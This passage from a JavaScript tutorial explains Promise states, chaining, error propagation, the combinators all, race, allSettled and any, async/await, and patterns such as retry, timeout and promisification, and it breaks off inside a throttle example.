operation((error, result) => {
  if (error) throw error;
  console.log(result);
});

// Promises
operation()
  .then((result) => console.log(result))
  .catch((error) => console.error(error));

// Async/Await
try {
  const result = await operation();
  console.log(result);
} catch (error) {
  console.error(error);
}
```

### Next Steps

- Master Promises and their power
- Learn async/await syntax
- Understand async patterns and antipatterns
- Apply to real-world projects
## Promises 



## Promise States

### The Three States

A Promise is always in one of three states:

1. **Pending** - Initial state, operation hasn't completed yet
2. **Fulfilled** - Operation completed successfully (resolved)
3. **Rejected** - Operation failed with an error

```javascript
// âœ… Promise states
const pending = new Promise(() => {
  // Does nothing, stays pending
});

const fulfilled = new Promise((resolve) => {
  resolve('Success');
  // State changes to fulfilled
});

const rejected = new Promise((resolve, reject) => {
  reject(new Error('Failure'));
  // State changes to rejected
});

// Once a promise settles (fulfilled or rejected), it cannot change
const settled = new Promise((resolve) => {
  resolve('First');
  resolve('Second');  // Ignored
  resolve('Third');   // Ignored
});

settled.then((value) => {
  console.log(value);  // Only logs 'First'
});
```

### State Transitions

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   PENDING   â”‚  â† Initial state
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚
        â”œâ”€ Called resolve(value)
        â”‚  â†“
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ FULFILLED   â”‚  â† Terminal state (immutable)
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚
        â”œâ”€ Called reject(error)
        â”‚  â†“
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  REJECTED   â”‚  â† Terminal state (immutable)
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Creating Promises

### Basic Promise Creation

```javascript
// âœ… Create and resolve immediately
const immediate = new Promise((resolve) => {
  resolve('Value');
});

// âœ… Create and reject immediately
const error = new Promise((resolve, reject) => {
  reject(new Error('Oops'));
});

// âœ… Asynchronous operation
const delayed = new Promise((resolve) => {
  setTimeout(() => {
    resolve('Done after 1 second');
  }, 1000);
});

// âœ… Conditional resolution/rejection
const conditional = new Promise((resolve, reject) => {
  const randomValue = Math.random();
  
  if (randomValue > 0.5) {
    resolve('Success');
  } else {
    reject(new Error('Unlucky'));
  }
});
```

### Promise Executor Function

```javascript
// âœ… Executor runs immediately
console.log('1');

const promise = new Promise((resolve, reject) => {
  console.log('2');  // Runs immediately
  resolve('3');
});

console.log('4');

// Output: 1, 2, 4
// Then: 3 (async handler)

promise.then((value) => {
  console.log(value);
});
```

### Common Promise Patterns

```javascript
// âœ… Timeout pattern
function timeoutPromise(ms) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve('Timeout completed');
    }, ms);
  });
}

// âœ… Rejection pattern
function rejectAfter(ms) {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(new Error('Operation timed out'));
    }, ms);
  });
}

// âœ… Immediate resolution
function resolved(value) {
  return Promise.resolve(value);
}

// âœ… Immediate rejection
function rejected(error) {
  return Promise.reject(error);
}

// Usage
timeoutPromise(100).then((msg) => console.log(msg));
```

---

## then(), catch(), finally()

### then() - Handle Fulfilled State

```javascript
// âœ… Basic then()
const promise = Promise.resolve('Success');

promise.then((value) => {
  console.log('Fulfilled:', value);
});

// âœ… then() returns a new promise
const chain = promise
  .then((value) => {
    console.log('First then:', value);
    return value.toUpperCase();
  })
  .then((uppercased) => {
    console.log('Second then:', uppercased);
  });

// âœ… then() with transformation
Promise.resolve(5)
  .then((num) => num * 2)
  .then((doubled) => doubled + 10)
  .then((result) => console.log(result));  // 20
```

### catch() - Handle Rejected State

```javascript
// âœ… Basic catch()
const failed = Promise.reject(new Error('Oops'));

failed.catch((error) => {
  console.error('Caught error:', error.message);
});

// âœ… catch() returns a new promise
Promise.reject(new Error('First error'))
  .catch((error) => {
    console.error('Handling:', error.message);
    return 'Recovered';  // Returns resolved promise
  })
  .then((result) => {
    console.log('After recovery:', result);
  });

// âœ… Multiple catch handlers
Promise.reject(new Error('Error 1'))
  .catch((error) => {
    throw new Error('Error 2');  // Convert to different error
  })
  .catch((error) => {
    console.error('Final catch:', error.message);
  });
```

### finally() - Always Execute

```javascript
// âœ… finally() runs regardless of state
let cleanup = false;

Promise.resolve('Success')
  .finally(() => {
    cleanup = true;
    console.log('Cleaning up...');
  })
  .then(() => {
    console.log('Cleanup done:', cleanup);  // true
  });

// âœ… finally() with rejection
Promise.reject(new Error('Error'))
  .finally(() => {
    console.log('This runs even with error');
  })
  .catch((error) => {
    console.error('Error:', error.message);
  });

// âœ… Common pattern: resource management
function withResource(resourceId) {
  return acquireResource(resourceId)
    .then((resource) => {
      return doWork(resource);
    })
    .finally(() => {
      return releaseResource(resourceId);
    });
}
```

---

## Promise Chaining

### Method Chaining

```javascript
// âœ… Chain multiple operations
function step1() {
  return Promise.resolve('Step 1 complete');
}

function step2(input) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve(`Step 2: ${input}`);
    }, 100);
  });
}

function step3(input) {
  return Promise.resolve(`Step 3: ${input}`);
}

step1()
  .then((result) => {
    console.log(result);
    return step2(result);
  })
  .then((result) => {
    console.log(result);
    return step3(result);
  })
  .then((result) => {
    console.log(result);
  });
```

### Returning Promises from Handlers

```javascript
// âœ… Return promises to continue chain
Promise.resolve(1)
  .then((value) => {
    console.log('Value:', value);
    
    // Return another promise
    return new Promise((resolve) => {
      setTimeout(() => {
        resolve(value * 2);
      }, 100);
    });
  })
  .then((doubled) => {
    console.log('Doubled:', doubled);
    return Promise.resolve(doubled + 10);
  })
  .then((final) => {
    console.log('Final:', final);
  });

// Output: Value: 1, Doubled: 2, Final: 12
```

### Flattening Chains

```javascript
// âœ… Promises automatically flatten nested promises
const nested = Promise.resolve(
  Promise.resolve(
    Promise.resolve('Deeply nested')
  )
);

nested.then((value) => {
  console.log(value);  // 'Deeply nested' (automatically unwrapped)
});
```

---

## Error Propagation

### Error Handling in Chains

```javascript
// âœ… Error propagates through chain
Promise.resolve(1)
  .then((value) => {
    throw new Error('Error in first then');
  })
  .then((value) => {
    // This is skipped due to error
    console.log('Never executes');
  })
  .catch((error) => {
    console.error('Caught:', error.message);
  });

// âœ… Recovery from error
Promise.reject(new Error('Initial error'))
  .catch((error) => {
    console.error('Caught:', error.message);
    return 'Recovered';  // Recovers from error
  })
  .then((value) => {
    console.log('After recovery:', value);
  });
```

### Re-throwing Errors

```javascript
// âœ… Re-throw to propagate error
Promise.reject(new Error('Original error'))
  .catch((error) => {
    console.error('Caught:', error.message);
    
    if (error.message.includes('Original')) {
      throw error;  // Re-throw
    }
    
    return 'Handled';
  })
  .catch((error) => {
    console.error('Final catch:', error.message);
  });

// âœ… Convert error type
Promise.reject(new Error('Network error'))
  .catch((error) => {
    throw new Error(`Wrapped: ${error.message}`);
  })
  .catch((error) => {
    console.error(error.message);  // Wrapped: Network error
  });
```

---

## Promise.resolve() and Promise.reject()

### Promise.resolve()

```javascript
// âœ… Resolve with value
Promise.resolve('Value')
  .then((value) => {
    console.log(value);  // Value
  });

// âœ… Resolve with another promise
const original = Promise.resolve('Original');
const wrapped = Promise.resolve(original);

wrapped.then((value) => {
  console.log(value);  // Original
});

// âœ… Resolve with thenable (object with .then())
const thenable = {
  then(onFulfill) {
    onFulfill('Thenable value');
  }
};

Promise.resolve(thenable)
  .then((value) => {
    console.log(value);  // Thenable value
  });

// âœ… Convert values to promises
const promises = [1, 2, 3]
  .map(num => Promise.resolve(num * 2));

// All are now promises
```

### Promise.reject()

```javascript
// âœ… Create rejected promise
Promise.reject(new Error('Rejected'))
  .catch((error) => {
    console.error(error.message);
  });

// âœ… Reject with any value
Promise.reject('Rejection reason')
  .catch((reason) => {
    console.error(reason);
  });
```

---

## Promise.all()

### Execute Multiple Promises in Parallel

```javascript
// âœ… Wait for all promises to resolve
const p1 = Promise.resolve(1);
const p2 = new Promise(resolve => setTimeout(() => resolve(2), 100));
const p3 = Promise.resolve(3);

Promise.all([p1, p2, p3])
  .then((results) => {
    console.log(results);  // [1, 2, 3]
  });

// âœ… Fails if any promise rejects
Promise.all([
  Promise.resolve('a'),
  Promise.reject(new Error('Error')),
  Promise.resolve('c')
])
  .catch((error) => {
    console.error('Error caught:', error.message);
    // Results b and c are ignored
  });
```

### Practical Promise.all() Examples

```javascript
// âœ… Fetch multiple resources
function fetchUsers() {
  return Promise.all([
    fetch('/api/user/1'),
    fetch('/api/user/2'),
    fetch('/api/user/3')
  ])
  .then((responses) => Promise.all(responses.map(r => r.json())))
  .then((users) => {
    console.log('All users:', users);
    return users;
  });
}

// âœ… Parallel image loading
const imageUrls = [
  'image1.jpg',
  'image2.jpg',
  'image3.jpg'
];

const loadImages = imageUrls.map(url => 
  new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => resolve(url);
    img.onerror = () => reject(new Error(`Failed: ${url}`));
    img.src = url;
  })
);

Promise.all(loadImages)
  .then(() => {
    console.log('All images loaded');
  })
  .catch((error) => {
    console.error('Image loading failed:', error);
  });
```

---

## Promise.race()

### First Promise to Settle Wins

```javascript
// âœ… Promise.race returns first settled promise
const fast = Promise.resolve('Fast');
const slow = new Promise(resolve => setTimeout(() => resolve('Slow'), 1000));

Promise.race([fast, slow])
  .then((result) => {
    console.log(result);  // Fast
  });

// âœ… First rejection also wins
Promise.race([
  Promise.reject(new Error('First error')),
  Promise.resolve('Success'),
  new Promise(resolve => setTimeout(() => resolve('Slow'), 1000))
])
  .catch((error) => {
    console.error(error.message);  // First error
  });
```

### Practical Race Examples

```javascript
// âœ… Timeout pattern
function withTimeout(promise, timeoutMs) {
  const timeout = new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(new Error('Timeout'));
    }, timeoutMs);
  });
  
  return Promise.race([promise, timeout]);
}

// âœ… Usage
withTimeout(
  fetch('/api/data'),
  5000
)
  .then(response => response.json())
  .catch(error => console.error('Failed or timed out:', error));

// âœ… First successful fetch wins
const fetchFromMirrors = Promise.race([
  fetch('https://server1.com/data'),
  fetch('https://server2.com/data'),
  fetch('https://server3.com/data')
]);
```

---

## Promise.allSettled()

### Wait for All Promises Regardless of Outcome

```javascript
// âœ… Promise.allSettled waits for all, regardless of rejection
Promise.allSettled([
  Promise.resolve('a'),
  Promise.reject(new Error('b')),
  Promise.resolve('c')
])
  .then((results) => {
    console.log(results);
    // [
    //   { status: 'fulfilled', value: 'a' },
    //   { status: 'rejected', reason: Error('b') },
    //   { status: 'fulfilled', value: 'c' }
    // ]
  });

// âœ… Never rejects (always resolves)
Promise.allSettled([
  Promise.reject(new Error('Error 1')),
  Promise.reject(new Error('Error 2'))
])
  .then((results) => {
    // This executes (no error thrown)
    results.forEach(result => {
      if (result.status === 'rejected') {
        console.error('Failed:', result.reason);
      }
    });
  });
```

### Use Cases

```javascript
// âœ… Batch operations where partial failure is acceptable
function processItems(items) {
  const promises = items.map(item => processItem(item));
  
  return Promise.allSettled(promises)
    .then((results) => {
      const successes = results.filter(r => r.status === 'fulfilled');
      const failures = results.filter(r => r.status === 'rejected');
      
      console.log(`Processed ${successes.length}/${results.length}`);
      
      return {
        successes: successes.map(r => r.value),
        failures: failures.map(r => r.reason)
      };
    });
}

// âœ… Don't fail entire operation if one resource fails
Promise.allSettled([
  fetchUserProfile(),
  fetchUserPosts(),
  fetchUserComments()
])
  .then((results) => {
    const profile = results[0].status === 'fulfilled' ? results[0].value : null;
    const posts = results[1].status === 'fulfilled' ? results[1].value : [];
    const comments = results[2].status === 'fulfilled' ? results[2].value : [];
    
    renderPage({ profile, posts, comments });
  });
```

---

## Promise.any()

### First Fulfilled Promise Wins

```javascript
// âœ… Promise.any returns first fulfilled (ignores rejections)
Promise.any([
  Promise.reject(new Error('Error 1')),
  Promise.reject(new Error('Error 2')),
  Promise.resolve('Success')
])
  .then((result) => {
    console.log(result);  // Success
  });

// âœ… Rejects only if ALL reject
Promise.any([
  Promise.reject(new Error('Error 1')),
  Promise.reject(new Error('Error 2')),
  Promise.reject(new Error('Error 3'))
])
  .catch((error) => {
    console.error(error.message);  // All promises were rejected
    console.error(error.errors);   // Array of all rejection reasons
  });
```

### Practical Examples

```javascript
// âœ… Try multiple sources, use first success
function fetchFromSources(url) {
  return Promise.any([
    fetch(`https://source1.com${url}`),
    fetch(`https://source2.com${url}`),
    fetch(`https://source3.com${url}`)
  ])
  .then(response => response.json())
  .catch(error => {
    console.error('All sources failed');
    throw error;
  });
}
```

---

## Promise.try() (Proposal)

### Wrapping Sync and Async Code

```javascript
// âœ… Promise.try() handles both sync and async errors
// (This is a Stage 3 proposal, not yet standard)

// Simulated implementation
function promiseTry(fn) {
  return Promise.resolve().then(fn);
}

// Usage
promiseTry(() => {
  throw new Error('Sync error');
})
  .catch((error) => {
    console.error('Caught:', error.message);
  });

// vs without Promise.try (must handle sync errors)
try {
  const result = (async () => {
    throw new Error('Error');
  })();
  
  result.catch(error => console.error(error));
} catch (error) {
  console.error(error);
}
```

---

## Practical Examples

### Example 1: Sequential Fetch

```javascript
// âœ… Fetch user, then posts, then comments
function loadUserData(userId) {
  return fetch(`/api/users/${userId}`)
    .then(response => response.json())
    .then((user) => {
      return fetch(`/api/users/${userId}/posts`)
        .then(response => response.json())
        .then((posts) => ({ user, posts }));
    })
    .then(({ user, posts }) => {
      return fetch(`/api/posts/${posts[0].id}/comments`)
        .then(response => response.json())
        .then((comments) => ({ user, posts, comments }));
    })
    .catch((error) => {
      console.error('Failed to load user data:', error);
    });
}

loadUserData(1).then(data => console.log(data));
```

### Example 2: Parallel Requests with Fallback

```javascript
// âœ… Try primary then fallback
function loadWithFallback() {
  return Promise.any([
    fetch('/api/primary/data'),
    new Promise(resolve => 
      setTimeout(() => resolve(fetch('/api/fallback/data')), 1000)
    )
  ])
  .then(response => response.json());
}
```

### Example 3: Retry Logic

```javascript
// âœ… Retry with exponential backoff
function retryWithBackoff(fn, maxRetries = 3, delay = 1000) {
  return fn().catch((error) => {
    if (maxRetries === 0) throw error;
    
    return new Promise(resolve => {
      setTimeout(() => {
        resolve(retryWithBackoff(fn, maxRetries - 1, delay * 2));
      }, delay);
    });
  });
}

retryWithBackoff(() => fetch('/api/data'), 3)
  .then(response => response.json())
  .catch(error => console.error('Failed after retries'));
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Use Promise.all for parallel operations
Promise.all([
  fetch('/api/1'),
  fetch('/api/2'),
  fetch('/api/3')
]);

// âœ… Chain promises for sequential operations
Promise.resolve(1)
  .then(x => x * 2)
  .then(x => x + 10);

// âœ… Use catch to handle errors
promise
  .then(success)
  .catch(error);

// âœ… Use finally for cleanup
promise
  .finally(() => {
    cleanup();
  });

// âœ… Return promises from handlers
.then(result => {
  return anotherPromise(result);
});
```

### âŒ DON'T

```javascript
// âŒ Don't create "promise inside promise"
new Promise((resolve) => {
  new Promise((innerResolve) => {
    innerResolve('value');
  }).then(v => resolve(v));
});

// âŒ Don't forget to return in chain
promise
  .then(result => {
    anotherPromise(result);  // Forgot to return!
  });

// âŒ Don't use .then() for sync operations
Promise.resolve()
  .then(() => {
    const x = 2 + 2;  // Should just do this directly
  });

// âŒ Don't catch and re-throw without handling
promise
  .catch(error => {
    throw error;  // Just let it propagate
  });
```

---

## Summary

### Promise Methods Overview

| Method | Purpose | Returns |
|--------|---------|---------|
| **then()** | Handle fulfilled value | New promise |
| **catch()** | Handle rejection | New promise |
| **finally()** | Always execute | New promise |
| **Promise.resolve()** | Create fulfilled promise | Promise |
| **Promise.reject()** | Create rejected promise | Promise |
| **Promise.all()** | All must succeed | Promise |
| **Promise.race()** | First to settle | Promise |
| **Promise.allSettled()** | Wait for all | Promise |
| **Promise.any()** | First fulfilled | Promise |

### When to Use Each Combinator

```javascript
// All must succeed
Promise.all([p1, p2, p3])

// First to settle wins
Promise.race([p1, p2, p3])

// All complete, partial failures OK
Promise.allSettled([p1, p2, p3])

// First success wins (skip failures)
Promise.any([p1, p2, p3])
```

### Next Steps

- Master async/await for cleaner syntax
- Learn async patterns and best practices
- Understand concurrency patterns
- Apply to real-world scenarios
## Async/Await 



## async Functions

### Declaring async Functions

```javascript
// âœ… Function declaration
async function fetchData() {
  return 'data';
}

// âœ… Function expression
const fetchData = async function() {
  return 'data';
};

// âœ… Arrow function
const fetchData = async () => {
  return 'data';
};

// âœ… Method in class
class DataFetcher {
  async getData() {
    return 'data';
  }
}

// âœ… Method in object
const fetcher = {
  async getData() {
    return 'data';
  }
};
```

### What async Does

```javascript
// âœ… async function always returns a promise
async function example() {
  return 'value';
}

const result = example();
console.log(result instanceof Promise);  // true

result.then(value => {
  console.log(value);  // 'value'
});

// âœ… Even if you return synchronously
async function immediate() {
  return 42;
}

immediate().then(value => {
  console.log(value);  // 42 (wrapped in promise)
});

// âœ… Thrown errors become rejections
async function error() {
  throw new Error('Oops');
}

error().catch(err => {
  console.error(err.message);  // Oops
});
```

### Async Function Scope

```javascript
// âœ… async function creates its own scope
async function outer() {
  const outerVar = 'outer';
  
  async function inner() {
    console.log(outerVar);  // Can access outer scope
  }
  
  await inner();
}

// âœ… Variables are isolated
async function isolatedScope() {
  const data = 'local';
}

// console.log(data);  // ReferenceError: data is not defined
```

---

## await Expression

### Basic await

```javascript
// âœ… await pauses execution until promise settles
async function example() {
  console.log('1. Start');
  
  const result = await Promise.resolve('2. Middle');
  console.log(result);
  
  console.log('3. End');
}

example();

// Output:
// 1. Start
// 2. Middle
// 3. End
```

### await with Different Promise States

```javascript
// âœ… await with fulfilled promise
async function withSuccess() {
  const value = await Promise.resolve('Success');
  console.log(value);  // Success
}

// âœ… await with rejected promise (throws error)
async function withError() {
  try {
    const value = await Promise.reject(new Error('Oops'));
  } catch (error) {
    console.error(error.message);  // Oops
  }
}

// âœ… await with delayed promise
async function withDelay() {
  console.log('Waiting...');
  const result = await new Promise(resolve => {
    setTimeout(() => resolve('Done'), 1000);
  });
  console.log(result);  // Done (after 1 second)
}
```

### await with Non-Promise Values

```javascript
// âœ… await works with non-promise values (wraps them)
async function withValue() {
  const num = await 42;
  console.log(num);  // 42
  
  const str = await 'hello';
  console.log(str);  // hello
}

// âœ… await with thenable
const thenable = {
  then(resolve) {
    resolve('Thenable value');
  }
};

async function withThenable() {
  const value = await thenable;
  console.log(value);  // Thenable value
}
```

### Multiple Awaits

```javascript
// âœ… Sequential awaits
async function sequential() {
  console.log('1');
  await delay(100);
  console.log('2');
  await delay(100);
  console.log('3');
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Takes 200ms total
sequential();
```

---

## Error Handling with try/catch

### Basic try/catch

```javascript
// âœ… Catch errors from await
async function withErrorHandling() {
  try {
    const result = await Promise.reject(new Error('Failed'));
  } catch (error) {
    console.error('Caught:', error.message);
  }
}

// âœ… Multiple awaits with shared error handling
async function multipleAwaits() {
  try {
    const user = await fetchUser(1);
    const posts = await fetchPosts(user.id);
    const comments = await fetchComments(posts[0].id);
    
    return { user, posts, comments };
  } catch (error) {
    console.error('Operation failed:', error.message);
    throw error;  // Re-throw if needed
  }
}
```

### Error Propagation

```javascript
// âœ… Error in await stops execution
async function errorStops() {
  console.log('1');
  
  try {
    await Promise.reject(new Error('Error'));
    console.log('2');  // Never executes
  } catch (error) {
    console.log('3');  // Executes
  }
  
  console.log('4');  // Continues after catch
}

// âœ… Specific error handling
async function specificHandling() {
  try {
    const response = await fetch('/api/data');
    const data = await response.json();
    return data;
  } catch (error) {
    if (error instanceof TypeError) {
      console.error('Network error:', error);
    } else if (error instanceof SyntaxError) {
      console.error('Invalid JSON:', error);
    } else {
      console.error('Unknown error:', error);
    }
  }
}
```

### finally Block

```javascript
// âœ… finally runs regardless of outcome
async function withFinally() {
  const resource = await acquireResource();
  
  try {
    console.log('Using resource');
    await doWork(resource);
  } catch (error) {
    console.error('Error:', error);
  } finally {
    console.log('Cleaning up');
    releaseResource(resource);
  }
}

// âœ… finally for logging/metrics
async function withMetrics() {
  const start = Date.now();
  
  try {
    return await operation();
  } catch (error) {
    console.error('Operation failed');
    throw error;
  } finally {
    console.log(`Operation took ${Date.now() - start}ms`);
  }
}
```

---

## Parallel Execution

### Running Awaits in Parallel

```javascript
// âŒ WRONG: Sequential (takes longer)
async function sequential() {
  const user = await fetchUser(1);     // 100ms
  const posts = await fetchPosts(1);   // 100ms
  const comments = await fetchComments(1);  // 100ms
  
  // Total: 300ms
  return { user, posts, comments };
}

// âœ… CORRECT: Parallel (faster!)
async function parallel() {
  const [user, posts, comments] = await Promise.all([
    fetchUser(1),       // Starts immediately
    fetchPosts(1),      // Starts immediately
    fetchComments(1)    // Starts immediately
  ]);
  
  // Total: 100ms (all run in parallel)
  return { user, posts, comments };
}

// âœ… Alternative with Promise.all
async function parallelAlternative() {
  const promises = [
    fetchUser(1),
    fetchPosts(1),
    fetchComments(1)
  ];
  
  const results = await Promise.all(promises);
  return results;
}
```

### Partial Parallelization

```javascript
// âœ… Some operations depend on others
async function partialParallel() {
  // Get user first (needed for other fetches)
  const user = await fetchUser(1);
  
  // These can run in parallel
  const [posts, settings, recommendations] = await Promise.all([
    fetchPosts(user.id),
    fetchSettings(user.id),
    fetchRecommendations(user.id)
  ]);
  
  return { user, posts, settings, recommendations };
}
```

---

## Sequential vs Concurrent Patterns

### Sequential Pattern (Dependent Operations)

```javascript
// âœ… Each operation depends on the previous
async function sequential() {
  const user = await getUser(userId);
  
  const userPosts = await getPosts(user.id);
  
  const firstPostComments = await getComments(userPosts[0].id);
  
  return { user, posts: userPosts, comments: firstPostComments };
}

// Don't do this in parallel:
// âŒ const [user, posts] = await Promise.all([getUser(userId), getPosts(userId)]);
// Because getPosts needs user.id which we get from getUser
```

### Concurrent Pattern (Independent Operations)

```javascript
// âœ… Operations don't depend on each other
async function concurrent() {
  // All can start immediately
  const [weather, news, stocks] = await Promise.all([
    fetchWeather(),
    fetchNews(),
    fetchStocks()
  ]);
  
  return { weather, news, stocks };
}
```

### Mixed Pattern (Some Dependent, Some Independent)

```javascript
// âœ… Smart combination
async function mixed() {
  // Step 1: Get independent data in parallel
  const [weather, news] = await Promise.all([
    fetchWeather(),
    fetchNews()
  ]);
  
  // Step 2: Get data that depends on Step 1
  const [forecast, headlines] = await Promise.all([
    getForecast(weather.location),
    getHeadlines(news.category)
  ]);
  
  return { weather, news, forecast, headlines };
}
```

---

## Top-Level await

### Using await Outside async Function

```javascript
// âœ… Top-level await (ES2022, modules only)
// In a .mjs file or type: module in package.json

const response = await fetch('/api/data');
const data = await response.json();

console.log('Data loaded:', data);

// Must be in module context, not global scope
```

### Use Cases

```javascript
// âœ… Initialize module
const config = await loadConfig();
const db = await connectDatabase(config);

export { db, config };

// âœ… Conditional imports
const API_URL = await getApiUrl();

const client = API_URL.includes('localhost')
  ? await import('./mockClient.js')
  : await import('./realClient.js');

export { client };

// âœ… Running code at module load
await migrateDatabase();
console.log('Database ready');
```

### Browser Support

```javascript
// âœ… Top-level await in module script
// <script type="module">
//   const data = await fetch('/api/data').then(r => r.json());
//   console.log(data);
// </script>

// Note: Only in modules (type="module")
// NOT in regular scripts or IIFE
```

---

## Async Function Return Values

### Return Types

```javascript
// âœ… Explicit return
async function withReturn() {
  return { data: 'value' };
}

withReturn().then(result => {
  console.log(result);  // { data: 'value' }
});

// âœ… No explicit return (returns undefined)
async function noReturn() {
  console.log('doing work');
}

noReturn().then(result => {
  console.log(result);  // undefined
});

// âœ… Conditional returns
async function conditional(success) {
  if (success) {
    return 'Success value';
  } else {
    throw new Error('Failed');
  }
}

// âœ… Returning another promise
async function chainedPromises() {
  return await new Promise(resolve => {
    setTimeout(() => resolve('value'), 100);
  });
}
```

### Type Inference

```javascript
// âœ… Return type is Promise<T>
async function returns(): Promise<string> {
  return 'value';
}

// âœ… Can't return Promise<Promise<T>>
// (gets flattened automatically)
async function flat() {
  return Promise.resolve(Promise.resolve('value'));
  // Returns Promise<string>, not Promise<Promise<string>>
}
```

---

## Common Patterns

### Pattern 1: Retry with Exponential Backoff

```javascript
// âœ… Automatic retry
async function retryWithBackoff(
  fn,
  maxRetries = 3,
  delay = 1000
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      
      const waitTime = delay * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, waitTime));
      console.log(`Retry ${i + 1}...`);
    }
  }
}

// Usage
const data = await retryWithBackoff(
  () => fetch('/api/data').then(r => r.json()),
  3,
  1000
);
```

### Pattern 2: Timeout

```javascript
// âœ… Promise with timeout
async function withTimeout(promise, timeoutMs) {
  const timeout = new Promise((_, reject) => {
    setTimeout(() => {
      reject(new Error('Operation timed out'));
    }, timeoutMs);
  });
  
  return Promise.race([promise, timeout]);
}

// Usage
try {
  const result = await withTimeout(
    fetch('/api/slow-endpoint'),
    5000
  );
} catch (error) {
  console.error(error.message);  // Operation timed out
}
```

### Pattern 3: Batch Processing

```javascript
// âœ… Process items in batches
async function processBatch(items, batchSize = 5) {
  const results = [];
  
  for (let i = 0; i < items.length; i += batchSize) {
    const batch = items.slice(i, i + batchSize);
    const batchResults = await Promise.all(
      batch.map(item => processItem(item))
    );
    results.push(...batchResults);
  }
  
  return results;
}

// Usage
const allResults = await processBatch(hugeArray, 10);
```

### Pattern 4: Sequential Operations

```javascript
// âœ… Array of async operations
async function sequentialOperations(items) {
  const results = [];
  
  for (const item of items) {
    const result = await process(item);
    results.push(result);
  }
  
  return results;
}

// Usage
const results = await sequentialOperations([1, 2, 3, 4, 5]);
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Use async for functions that need to await
async function fetchData() {
  const response = await fetch('/api/data');
  return response.json();
}

// âœ… Use try-catch for error handling
async function safeOperation() {
  try {
    const result = await operation();
    return result;
  } catch (error) {
    console.error('Error:', error);
    throw error;  // Or handle appropriately
  }
}

// âœ… Use Promise.all for parallel operations
async function parallel() {
  const [a, b, c] = await Promise.all([
    fetchA(),
    fetchB(),
    fetchC()
  ]);
  return { a, b, c };
}

// âœ… Return promises from async functions
async function returnsPromise() {
  return await somePromise;
  // Or: return somePromise;
}

// âœ… Use finally for cleanup
async function withCleanup() {
  try {
    return await operation();
  } finally {
    cleanup();
  }
}
```

### âŒ DON'T

```javascript
// âŒ Don't use async if you don't need await
// Use regular function instead
async function unnecessary() {
  return { data: 'value' };
}

// âœ… Should be:
function unnecessary() {
  return { data: 'value' };
}

// âŒ Don't await non-promises unnecessarily
async function pointless() {
  const x = await 42;  // Unnecessary await
  return x;
}

// âŒ Don't use await in loops when parallel is possible
async function slowLoop() {
  const results = [];
  for (const item of items) {
    results.push(await process(item));  // Sequential!
  }
  return results;
}

// âœ… Should be:
async function fastParallel() {
  return Promise.all(items.map(item => process(item)));
}

// âŒ Don't swallow errors silently
async function swallowErrors() {
  try {
    await operation();
    // Error silently ignored!
  } catch (error) {
    // Should at least log
  }
}

// âŒ Don't forget to return from async
async function forgetsReturn() {
  await operation();
  // Forgot return!
}

// âœ… Should be:
async function properReturn() {
  return await operation();
}
```

---

## Summary

### Async/Await Key Points

| Concept | Details |
|---------|---------|
| **async** | Declares async function, returns Promise |
| **await** | Pauses execution, waits for promise |
| **Try/catch** | Error handling for await |
| **Finally** | Cleanup code |
| **Parallel** | Use Promise.all for independent operations |
| **Sequential** | Use await in sequence for dependent operations |
| **Top-level await** | ES2022, modules only |

### Execution Flow

```javascript
async function example() {
  console.log('1');           // Executes immediately
  
  await delay(100);           // Pauses here
  
  console.log('2');           // Resumes after delay
}

example();
console.log('3');             // Executes before '2'

// Output: 1, 3, 2
```

### Quick Comparison

```javascript
// Promise-based
promise
  .then(handleSuccess)
  .catch(handleError)
  .finally(cleanup);

// Async/await
try {
  const result = await promise;
  handleSuccess(result);
} catch (error) {
  handleError(error);
} finally {
  cleanup();
}
```

### Next Steps

- Master async patterns
- Learn concurrent patterns
- Understand error handling strategies
- Apply to production code
## Async Patterns



## Promisification

### Converting Callbacks to Promises

```javascript
// âŒ Callback-based (Node.js style)
function readFile(filename, callback) {
  // Simulated async operation
  setTimeout(() => {
    if (filename) {
      callback(null, `Contents of ${filename}`);
    } else {
      callback(new Error('No filename'));
    }
  }, 100);
}

// âœ… Convert to promise
function readFilePromise(filename) {
  return new Promise((resolve, reject) => {
    readFile(filename, (error, data) => {
      if (error) {
        reject(error);
      } else {
        resolve(data);
      }
    });
  });
}

// Now usable with async/await
async function loadFiles() {
  try {
    const file1 = await readFilePromise('file1.txt');
    const file2 = await readFilePromise('file2.txt');
    console.log(file1, file2);
  } catch (error) {
    console.error('Error:', error);
  }
}

loadFiles();
```

### Generic Promisification Helper

```javascript
// âœ… Convert any callback-based function
function promisify(fn) {
  return function(...args) {
    return new Promise((resolve, reject) => {
      fn(...args, (error, result) => {
        if (error) {
          reject(error);
        } else {
          resolve(result);
        }
      });
    });
  };
}

// Usage
const readFileAsync = promisify(readFile);
const data = await readFileAsync('file.txt');

// âœ… Multiple arguments
function add(a, b, callback) {
  setTimeout(() => {
    callback(null, a + b);
  }, 100);
}

const addAsync = promisify(add);
const result = await addAsync(5, 3);  // 8
```

### Built-in Promisification

```javascript
// âœ… Node.js util.promisify
const fs = require('fs');
const { promisify } = require('util');

const readFile = promisify(fs.readFile);

// Now it returns a promise
async function loadFile() {
  const content = await readFile('data.txt', 'utf-8');
  console.log(content);
}

loadFile();
```

---

## Throttling

### What is Throttling?

**Throttling** ensures a function is called at most once per specified time interval, even if events fire repeatedly.

```javascript
// âœ… Basic throttle implementation
function throttle(fn, delay) {
  let lastCall = 0;
  
  return function(...args) {
    const now = Date.now();
    
